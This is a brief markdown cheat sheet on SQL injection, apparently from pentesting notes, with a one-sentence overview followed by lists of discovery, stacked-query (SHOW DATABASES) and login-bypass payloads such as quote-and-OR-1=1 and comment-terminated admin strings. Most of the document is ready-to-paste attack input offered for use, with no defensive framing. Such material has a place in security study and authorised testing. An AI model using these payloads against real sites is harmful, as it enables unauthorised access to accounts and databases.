# Sql Injection

## Overview

SQL Injection58 is a common web vulnerability found in dynamic sites that is caused by unsanitized user input, which is then passed on to a database.  This user input can then be manipulated to “break out” of the original query made by the developers, to include more malicious actions.

## Discovery

Good payload to for discovery is :

    '
    --

## Simple Payloads

    1'; SHOW DATABASES;
    1'; SHOW DATABASES;'

## Auth Bypass Payloads

    admin' or '1'='1
    admin')-- -
    admin') OR 1=1 -- '